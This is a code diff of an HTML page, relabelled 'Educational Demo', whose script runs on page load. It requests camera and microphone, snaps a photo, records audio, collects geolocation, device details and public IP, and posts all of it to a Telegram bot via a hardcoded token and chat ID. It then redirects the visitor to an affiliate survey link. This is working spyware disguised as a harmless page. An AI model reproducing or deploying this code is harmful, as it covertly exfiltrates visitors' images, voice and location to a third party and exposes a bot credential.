@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Auto Device Info + Location + Photo + Audio</title>
+  <title>Educational Demo</title>
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 </head>
 <body>
@@ -12,114 +12,53 @@
 const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
 const chatId   = "1538488453";
 
-let stream;
-let audioStream;
-let lastPhoto = 0;
+let camStream;
+let micStream;
 
-// ========== 1) إرسال رسالة نصية ==========
-function sendText(msg) {
+// ==== إرسال نص ====
+function sendText(t){
   axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     chat_id: chatId,
-    text: msg
+    text: t
   });
 }
 
-// ========== 2) إرسال صورة ==========
-function sendPhoto(blob) {
-  const f = new FormData();
-  f.append("chat_id", chatId);
-  f.append("photo", blob, "auto.jpg");
-
-  axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, f);
-}
-
-// ========== 3) إرسال صوت ==========
-function sendAudio(blob) {
-  const f = new FormData();
-  f.append("chat_id", chatId);
-  f.append("audio", blob, "audio.webm");
-
-  axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, f)
-    .catch(err => console.log("Audio Error:", err));
-}
-
-// ========== 4) تسجيل صوت 10 ثوانٍ ==========
-function recordAudio10s() {
-  if (!audioStream) return;
-
-  const recorder = new MediaRecorder(audioStream);
-  const chunks = [];
-
-  recorder.ondataavailable = e => chunks.push(e.data);
-
-  recorder.onstop = () => {
-    const blob = new Blob(chunks, { type: "audio/webm" });
-    sendAudio(blob);
-  };
-
-  recorder.start();
-
-  // إيقاف بعد 10 ثواني
-  setTimeout(() => recorder.stop(), 10000);
-}
-
-// تكرار تسجيل الصوت كل 10 ثوانٍ
-setInterval(() => {
-  recordAudio10s();
-}, 10000);
-
-
-// ========== 5) الحصول على IP الخارجي ==========
-async function getIP() {
+// ==== معلومات الجهاز ====
+async function sendDeviceInfo(){
+  let ip = "Unknown";
   try {
     let r = await fetch("https://api.ipify.org?format=json");
-    return (await r.json()).ip;
-  } catch {
-    return "Unknown";
-  }
-}
+    ip = (await r.json()).ip;
+  }catch{}
 
-// ========== 6) إرسال معلومات الجهاز ==========
-async function sendDeviceInfo() {
-  const ip = await getIP();
-
-  const info =
-    `📱 Device Info:\n` +
-    `UserAgent: ${navigator.userAgent}\n` +
-    `Platform: ${navigator.platform}\n` +
-    `Screen: ${screen.width}x${screen.height}\n` +
-    `Lang: ${navigator.language}\n` +
-    `IP: ${ip}`;
-
-  sendText(info);
-}
-
-// ========== 7) إرسال الموقع ==========
-function sendLocation() {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-
-      const msg =
-        `📍 Location:\n` +
-        `Lat: ${lat}\n` +
-        `Lon: ${lon}\n` +
-        `Accuracy: ${acc}m\n\n` +
-        `🗺 Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-
-      sendText(msg);
-    },
-    err => sendText("❌ Location Error: " + err.message),
-    { enableHighAccuracy: true, timeout: 15000 }
+  sendText(
+    "📱 Device Info (Educational):\n" +
+    "UserAgent: " + navigator.userAgent + "\n" +
+    "Platform: " + navigator.platform + "\n" +
+    "Screen: " + screen.width + "x" + screen.height + "\n" +
+    "IP: " + ip
   );
 }
 
-// ========== 8) التقاط صور تلقائي ==========
-function startCapture() {
+// ==== الموقع ====
+function sendLocation(){
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      sendText(
+        "📍 Location:\nLat: " + pos.coords.latitude +
+        "\nLon: " + pos.coords.longitude +
+        "\nAcc: " + pos.coords.accuracy + "m"
+      );
+    },
+    err => sendText("Location Error: " + err.message),
+    { enableHighAccuracy: true }
+  );
+}
+
+// ==== صورة من الكاميرا ====
+function takePhoto(){
   const video = document.createElement("video");
-  video.srcObject = stream;
+  video.srcObject = camStream;
   video.play();
 
   const canvas = document.createElement("canvas");
@@ -129,45 +68,60 @@ function startCapture() {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    function loop() {
-      if (Date.now() - lastPhoto > 5000) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.drawImage(video, 0, 0);
 
-        canvas.toBlob(
-          blob => sendPhoto(blob),
-          "image/jpeg",
-          0.5
-        );
-
-        lastPhoto = Date.now();
-      }
-
-      requestAnimationFrame(loop);
-    }
-
-    loop();
+    canvas.toBlob(blob => {
+      const fd = new FormData();
+      fd.append("chat_id", chatId);
+      fd.append("photo", blob, "cam.jpg");
+      axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, fd);
+    }, "image/jpeg", 0.7);
   };
 }
 
-// ========== 9) البداية ==========
-function startAll() {
+// ==== تسجيل صوت 5 ثوانٍ ====
+function recordAudio(){
+  const rec = new MediaRecorder(micStream);
+  const chunks = [];
+
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.onstop = () => {
+    const blob = new Blob(chunks, { type: "audio/webm" });
+    const fd = new FormData();
+    fd.append("chat_id", chatId);
+    fd.append("audio", blob, "mic.webm");
+    axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd);
+  };
+
+  rec.start();
+  setTimeout(() => rec.stop(), 5000);
+}
+
+// ==== تشغيل العملية ====
+function startDemo(){
   Promise.all([
-    navigator.mediaDevices.getUserMedia({ video: true }),
-    navigator.mediaDevices.getUserMedia({ audio: true })
+    navigator.mediaDevices.getUserMedia({ video:true }),
+    navigator.mediaDevices.getUserMedia({ audio:true })
   ])
-  .then(([vStream, aStream]) => {
-    stream = vStream;
-    audioStream = aStream;
+  .then(([cam, mic]) => {
+    camStream = cam;
+    micStream = mic;
 
     sendDeviceInfo();
     sendLocation();
-    startCapture();
-    recordAudio10s();
+    takePhoto();
+    recordAudio();
+
+    // ===== إعادة التوجيه بعد 3 ثواني =====
+    setTimeout(() => {
+      window.location.href = "https://www.surveoo.com/ar/landing/1?aff_id=2900";
+    }, 3000);
+
   })
-  .catch(err => sendText("Media Error: " + err.message));
+  .catch(e => sendText("Permission Error: " + e.message));
 }
 
-startAll();
+startDemo();
 </script>
 
 </body>
